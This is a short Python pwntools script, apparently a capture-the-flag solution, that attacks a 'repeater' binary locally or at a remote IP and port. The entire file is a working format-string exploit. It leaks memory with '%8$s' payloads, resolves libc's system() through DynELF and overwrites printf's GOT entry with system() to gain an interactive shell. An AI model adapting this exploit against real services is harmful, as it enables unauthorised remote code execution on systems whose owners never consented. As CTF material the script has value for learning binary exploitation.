#/usr/bin/env python
from pwn import *
from libformatstr import * 
import sys

#nc 106.75.126.184 58579
if len(sys.argv) > 1:
	p = remote('106.75.126.184', 58579)
else:
	p = process('./pwn')


p.recvuntil("Do you know repeater?\n")
bin = ELF('./pwn')
printf_plt = bin.symbols['printf']

def leak(addr):
	payload = "BB%8$sCC" + p32(addr)
	p.sendline(payload)
	p.recvuntil("BB")
	data = p.recvuntil("CC")[:-2] + "\x00" 

	return data

d = DynELF(leak, elf = ELF('./pwn'))

system_addr = d.lookup('system', 'libc')
print "[+] find system addr: " + hex(system_addr)

printf_got = bin.got['printf']
bufsiz = 100                    # size of cyclic pattern to send
buf = "" 

payload2 = FormatStr(bufsiz)
payload2[printf_got] = system_addr
buf = payload2.payload(6, 0)

p.sendline(buf)

p.interactive()